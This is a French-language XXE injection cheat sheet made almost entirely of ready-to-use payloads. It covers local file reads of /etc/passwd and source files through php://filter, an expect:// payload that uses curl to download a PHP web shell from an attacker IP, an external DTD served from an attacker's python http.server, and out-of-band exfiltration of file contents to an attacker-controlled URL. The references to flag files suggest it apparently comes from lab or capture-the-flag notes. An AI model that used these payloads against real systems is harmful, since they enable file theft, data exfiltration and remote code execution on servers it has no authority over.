## Injection de base

```xml
<email>
	&company;
</email>
```

## Inclusion de fichiers locaux (LFI)

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

## Injection avec téléchargement de shell

1. Créer un fichier `shell.php` avec un paramètre

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

## Exploitation avec DTD externe
### Préparation du serveur DTD

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > XXE.dtd
python3 -m http.server 8000
```

### Injection dans la requête XML

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://PWNIP:8000/XXE.dtd">
  %xxe;
]>
```

## XXE Out-Of-Band (OOB) Data Exfiltration

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

## Extraction de fichiers en Base64

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> ]>
<root>
    <name>&xxe;</name>
    <details>test</details>
    <date>2021-09-22</date>
</root>
```